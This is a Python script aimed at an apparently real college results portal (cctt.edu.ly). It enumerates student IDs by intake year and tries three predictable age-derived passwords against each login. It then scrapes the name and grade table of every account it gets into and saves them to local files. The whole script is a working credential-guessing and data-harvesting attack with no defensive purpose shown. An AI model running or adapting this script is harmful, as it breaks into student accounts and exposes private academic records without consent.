import requests,time,os,json,datetime,sys

current_year = datetime.date.today().year

study_year = int(str(current_year)[2:]) 


students_list = []
students_data2 = []
students_data = []

for i in range(7):
    if (study_year - (i+1)) == 20:
        continue
    semester1 = str(study_year - (i+1)) + "1"
    semester2 = str(study_year - (i+1)) + "2"
    for j in range(400):
        students_list.append(semester1+"{:03d}".format(j))
        students_list.append(semester2+"{:03d}".format(j))


for i in students_list:
    year_of_registering = "20"+i[:2]
    students_data.append({"id":i,"pass1":"{:02d}".format(int(year_of_registering)-18),"pass2":"{:02d}".format(int(year_of_registering)-19),"pass3":"{:02d}".format(int(year_of_registering)-20)})

for i in range(len(students_data)):
    students_data2.append(students_data[i])

counter = 0

# reset the file
f = open("./StudentsGradeList.html", "w")
f.write("<!DOCTYPE html>")
f.close()
test =open("./StudentsList.txt","w")
test.write("")
test.close()

# fill the file with all the students grades

for index,i in enumerate(students_data2):
    print("loading"+("."*((index%3)+1)),end="")
    print("trying...",end='\r')
    
    response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass1"]})
    if  response.text.find("<th>رمز المادة</th>") == -1:
        response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass2"]})
        if  response.text.find("<th>رمز المادة</th>") == -1:
             response = requests.post("http://cctt.edu.ly/result/",{"form-username":i["id"],"form-password":i["pass3"]})
             if  response.text.find("<th>رمز المادة</th>") == -1:
                 continue
    counter += 1
    sys.stdout.write("\033[F")
    print("\n"+str(counter)+"=>found and graping :" + i['id'] )
    test =open("./StudentsList.txt","a")
    test.write("\n"+str(counter)+" => id:" + i['id'] + "  name: "+ response.text[response.text.find(' <p class="pp">اسم الطالب:')+27:response.text.find('</p>',response.text.find(' <p class="pp">اسم الطالب:'))])
    test.close()
    f = open("./StudentsGradeList.html", "a")
    f.write("<br><br><br><br>")
   
    f.write("\n<!-- tag with id"+i['id']+" -->\n")
    f.write("<h1>"+str(counter)+"</h1>\n")
    f.write("<h1>"+response.text[response.text.find(' <p class="pp">اسم الطالب:')+26:response.text.find(' </p>',response.text.find(' <p class="pp">اسم الطالب:'))]+"</h1>\n")
    f.write(i['id'])
    f.write(response.text[response.text.find('<table dir="rtl"  cellspacing="0" align="center"  >'):response.text.find('<tr><td colspan="3">المعدل الفصلي : ')])
    f.write("</table>")
    f.write("<br><br><br><br>")
    f.write("<hr><hr>")
    f.close()



